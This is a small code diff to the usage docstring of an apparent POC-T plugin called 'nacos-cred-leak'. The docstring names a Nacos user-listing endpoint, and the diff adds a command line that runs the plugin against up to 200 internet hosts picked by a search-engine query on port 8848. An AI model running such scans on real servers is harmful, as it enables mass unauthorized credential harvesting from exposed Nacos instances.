@@ -8,6 +8,8 @@ http://[]:8848/nacos/v1/auth/users?pageNo=1&pageSize=1
 
 Usage：
 python POC-T.py -s nacos-cred-leak -aH "port=8848&&header.content_length=431" --limit 200
+
+python POC-T.py -s nacos-cred-leak -aF "port=8848 && header='Content-Length: 431'"
 """
 
 import random
